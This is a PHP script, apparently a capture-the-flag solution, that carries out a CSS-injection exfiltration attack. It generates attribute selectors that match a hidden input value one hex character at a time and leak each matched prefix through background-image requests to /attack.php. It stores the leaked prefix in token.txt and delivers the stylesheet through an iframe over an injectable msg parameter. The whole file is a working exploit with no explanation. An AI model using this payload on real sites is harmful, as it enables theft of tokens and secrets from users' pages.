<?php

if (isset($_GET['x'])) {
    $f = fopen('token.txt', 'w');
    fwrite($f, $_GET['x']);
    fclose($f);
    die('');
}

$token = file_get_contents('token.txt');
$xx = '';

for($i = 0; $i < 0x10; $i++){
    $g = dechex($i);
    $xx .= 'input[value^="'. $token.$g.'"] {
        background-image: url(/attack.php?x='. $token.$g .');
    }';
}

$css = <<<CSS
    }
body {}
body {}

$xx

{
CSS;

$css = urlencode($css);


$payload = '<link type="text/css" href="/page.php?msg='.$css.'" rel="stylesheet">';
$payload = urlencode($payload);
?>

<iframe src="./page.php?msg=<?=$payload?>"></iframe>
